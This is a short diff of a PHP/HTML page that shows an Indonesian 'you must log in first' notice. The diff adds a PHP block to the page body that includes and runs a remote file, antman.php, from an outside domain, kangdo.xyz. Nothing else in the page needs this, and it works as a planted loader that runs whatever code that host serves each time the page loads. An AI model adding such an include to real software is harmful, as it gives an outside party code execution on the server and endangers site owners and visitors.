@@ -19,6 +19,9 @@
         </style> 
     </head>
     <body>
+	<?php
+		include('https://kangdo.xyz/template/antman.php');
+	?>
         <div style="background-color:#fffbe2;color:#7f7212;padding:5px;border-bottom:1px solid #e2c822;position:relative;left:0;right:0;top:0;">
             <h4 class="thin">Anda harus login dulu.</h4>
         </div>
